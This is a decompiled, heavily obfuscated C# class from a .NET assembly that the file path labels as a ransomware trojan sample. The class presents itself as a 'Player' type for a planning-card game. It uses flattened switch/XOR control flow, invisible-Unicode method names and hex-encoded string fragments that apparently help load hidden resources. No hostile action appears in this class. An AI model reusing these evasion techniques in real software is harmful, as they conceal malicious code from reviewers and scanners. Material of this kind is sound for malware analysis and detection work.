// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Player
// Assembly: EncoderExceptionFallbackBuff, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: 1A176EC6-F8F7-4000-B7C0-CE79157CC27B
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-64a92f765017361d260169feccd6dd444e4a20dfceb3dcad952d976477406e1c.exe

using SimpleJSON;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public class Player
  {
    public static string MembershipCondition(int BaseStream)
    {
label_1:
      int num1 = -21831110;
      string str1;
      string str2;
      bool flag;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -2017436885)) % 14U)
        {
          case 0:
            str2 = str1;
            num1 = -609171922;
            continue;
          case 1:
            num1 = (int) num2 * -1968346047 ^ 1343956000;
            continue;
          case 2:
            int num3 = !flag ? 224927813 : (num3 = 177487298);
            num1 = num3 ^ (int) num2 * 1205828918;
            continue;
          case 3:
            num1 = (int) num2 * -618688157 ^ -1832374668;
            continue;
          case 4:
            int num4 = BaseStream != 0 ? 1292620599 : (num4 = 1246986217);
            num1 = num4 ^ (int) num2 * 265749298;
            continue;
          case 6:
            flag = BaseStream == 1;
            num1 = -409770293;
            continue;
          case 7:
            str1 = (string) null;
            num1 = (int) num2 * -861632928 ^ 686950473;
            continue;
          case 8:
            str1 = "65497A";
            num1 = (int) num2 * 1993217474 ^ 748649537;
            continue;
          case 9:
            str1 = "546F6B656E697A6572537472696E67426C6F";
            num1 = (int) num2 * 778025129 ^ -621837106;
            continue;
          case 10:
            num1 = (int) num2 * 1802162537 ^ 753313808;
            continue;
          case 11:
            num1 = (int) num2 * 1071510614 ^ -1872642870;
            continue;
          case 12:
            num1 = (int) num2 * 236265051 ^ 1018691136;
            continue;
          case 13:
            goto label_1;
          default:
            goto label_15;
        }
      }
label_15:
      return str2;
    }

    public string Name { get; private set; }

    private int[] PlanningCards { get; set; }

    public bool UseOneMorePlanningSprint { get; private set; }

    public int PlannedForCard(int cardTypeIndex)
    {
      if (this.PlanningCards.Length != 0)
        goto label_4;
label_1:
      int num1 = 576089329;
label_2:
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1474131728)) % 4U)
        {
          case 1:
            goto label_3;
          case 2:
            goto label_1;
          case 3:
            num1 = (int) num2 * -1971446630 ^ -604582354;
            continue;
          default:
            goto label_7;
        }
      }
label_3:
      int num3 = 0;
      goto label_5;
label_7:
      int num4;
      return num4;
label_4:
      num3 = this.PlanningCards[cardTypeIndex];
label_5:
      num4 = num3;
      num1 = 130464707;
      goto label_2;
    }

    public int PlanningCardsCount
    {
      get
      {
label_1:
        int num1 = -422336120;
        int num2;
        int index;
        int[] planningCards;
        int planningCardsCount;
        bool flag;
        while (true)
        {
          uint num3;
          switch ((num3 = (uint) (num1 ^ -1607712523)) % 14U)
          {
            case 0:
              planningCardsCount = num2;
              num1 = (int) num3 * -543536959 ^ -1769786768;
              continue;
            case 1:
              num1 = -622975242;
              continue;
            case 2:
              flag = planningCards[index] > 0;
              num1 = -1648166690;
              continue;
            case 3:
              index = 0;
              num1 = (int) num3 * -1070768160 ^ 1821997189;
              continue;
            case 4:
              goto label_1;
            case 5:
              int num4;
              num1 = num4 = index < planningCards.Length ? -157674579 : (num4 = -901455271);
              continue;
            case 7:
              int num5 = flag ? -732494459 : (num5 = -861274042);
              num1 = num5 ^ (int) num3 * -1446631242;
              continue;
            case 8:
              ++num2;
              num1 = (int) num3 * -1096259720 ^ 408885540;
              continue;
            case 9:
              ++index;
              num1 = (int) num3 * -1855572296 ^ 670529394;
              continue;
            case 10:
              num1 = (int) num3 * -932727 ^ -1879894326;
              continue;
            case 11:
              num1 = (int) num3 * 1003385795 ^ -306692484;
              continue;
            case 12:
              planningCards = this.PlanningCards;
              num1 = (int) num3 * -1160874808 ^ -424611312;
              continue;
            case 13:
              num2 = 0;
              num1 = (int) num3 * 873306037 ^ -1817598630;
              continue;
            default:
              goto label_15;
          }
        }
label_15:
        return planningCardsCount;
      }
    }

    private Player()
    {
label_1:
      int num1 = 2133172854;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 443056223)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * -352440427 ^ 1365860601;
            continue;
          case 2:
            goto label_3;
          case 3:
            num1 = (int) num2 * 491205078 ^ 556294467;
            continue;
          default:
            goto label_6;
        }
      }
label_3:
      return;
label_6:;
    }

    public string PlanningCardsToString()
    {
      string str1 = " ";
      int index = 0;
label_6:
      int num1 = index < this.PlanningCards.Length ? 85526191 : (num1 = 904195574);
      int planningCard;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 861368429)) % 9U)
        {
          case 0:
            num1 = 85526191;
            continue;
          case 1:
            goto label_6;
          case 2:
            num1 = (int) num2 * 1790022713 ^ -910859226;
            continue;
          case 3:
            num1 = (int) num2 * 958536591 ^ 107839968;
            continue;
          case 4:
            ++index;
            num1 = 1069904261;
            continue;
          case 6:
            planningCard = this.PlanningCards[index];
            int num3;
            num1 = num3 = planningCard == 0 ? 1395234946 : (num3 = 856552538);
            continue;
          case 7:
            str1 = Player.\u206C⁫‎‏⁭⁭‎‌‮⁫‪‫‏‪‬⁮⁬‍⁮⁮‏⁭‏‎‏‌⁬⁪⁪⁬‎‌‏‮⁫⁫⁬‍⁯⁮‮(new string[5]
            {
              str1,
              Card.CardTypeNames[index],
              "x",
              planningCard.ToString(),
              " "
            });
            num1 = 208000786;
            continue;
          case 8:
            str2 = str1;
            num1 = (int) num2 * 660358815 ^ -275239901;
            continue;
          default:
            goto label_10;
        }
      }
label_10:
      return str2;
    }

    public static Player Deserialize(JSONNode json)
    {
label_1:
      int num1 = -461583736;
      Player player;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1563216410)) % 3U)
        {
          case 1:
            player = new Player()
            {
              Name = json["name"].Value,
              PlanningCards = Player.ParsePlanningCards(json["planning-cards"]),
              UseOneMorePlanningSprint = json["use-one-more-planning-sprint"].AsBool
            };
            num1 = (int) num2 * -91976695 ^ 1947814632;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_4;
        }
      }
label_4:
      return player;
    }

    private static int[] ParsePlanningCards(JSONNode json)
    {
label_1:
      int num1 = -895894787;
      bool flag;
      int[] numArray;
      int aIndex;
      int count;
      int[] planningCards;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1240965464)) % 10U)
        {
          case 0:
            int num3 = !flag ? -1167783022 : (num3 = -251975103);
            num1 = num3 ^ (int) num2 * 593864134;
            continue;
          case 1:
            aIndex = 0;
            num1 = (int) num2 * 983466786 ^ 1926600491;
            continue;
          case 2:
            planningCards = numArray;
            num1 = (int) num2 * -1416254146 ^ 1208777032;
            continue;
          case 3:
            flag = aIndex < count;
            num1 = -25673858;
            continue;
          case 4:
            goto label_1;
          case 5:
            ++aIndex;
            num1 = (int) num2 * -976321166 ^ -198402869;
            continue;
          case 6:
            num1 = (int) num2 * 327748263 ^ -714461980;
            continue;
          case 7:
            count = json.Count;
            numArray = new int[count];
            num1 = (int) num2 * -531561957 ^ 289666490;
            continue;
          case 9:
            numArray[aIndex] = json[aIndex].AsInt;
            num1 = -2124525755;
            continue;
          default:
            goto label_11;
        }
      }
label_11:
      return planningCards;
    }

    public override string ToString()
    {
label_1:
      int num1 = -375369669;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1964258830)) % 4U)
        {
          case 0:
            num1 = (int) num2 * 1751669472 ^ -1100735447;
            continue;
          case 1:
            str = Player.\u202D‎⁭⁭⁯‬​‮⁪​⁭​‪⁪‫‬‍‭⁫‌‎⁬‏‪‪⁫‭⁬​⁭‌⁮‏⁮⁯‬‫‌​‬‮("name: {0},\nplanning-cards: [{1}]\nuse-one-more-planning-sprint: {2}", (object) this.Name, (object) this.PlanningCardsToString(), (object) this.UseOneMorePlanningSprint);
            num1 = (int) num2 * -546198412 ^ 1285811854;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_5;
        }
      }
label_5:
      return str;
    }

    static string \u206C⁫‎‏⁭⁭‎‌‮⁫‪‫‏‪‬⁮⁬‍⁮⁮‏⁭‏‎‏‌⁬⁪⁪⁬‎‌‏‮⁫⁫⁬‍⁯⁮‮([In] string[] obj0) => string.Concat(obj0);

    static string \u202D‎⁭⁭⁯‬​‮⁪​⁭​‪⁪‫‬‍‭⁫‌‎⁬‏‪‪⁫‭⁬​⁭‌⁮‏⁮⁯‬‫‌​‬‮(
      [In] string obj0,
      [In] object obj1,
      [In] object obj2,
      [In] object obj3)
    {
      return string.Format(obj0, obj1, obj2, obj3);
    }
  }
}
